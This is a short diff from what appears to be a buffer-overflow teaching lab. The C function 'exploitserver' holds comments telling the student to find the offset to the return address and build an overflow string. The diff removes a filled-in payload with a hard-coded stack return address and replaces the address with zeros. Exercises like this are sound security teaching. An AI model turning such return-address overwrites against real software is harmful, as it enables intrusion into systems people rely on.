@@ -53,7 +53,7 @@ void exploitserver(int clsck) {
   // !!! First, count the number of bytes between buf and the returen address of the foo function. !!!
   // !!! Second, figure out the return address based on RBP. !!!
   // !!! Now, change the overflow string with proper format and values. !!!
-  char overflow[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x70\xe0\xff\xff\xff\x7f\x00\x00";
+  char overflow[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x00\x00\x00\x00\x00\x00\x00\x00";
   int ofsize = strlen(overflow) + 8; // be sure to set ofsize to the size of the overflow string here.
 
   // !!! no need to modify anything below. !!!
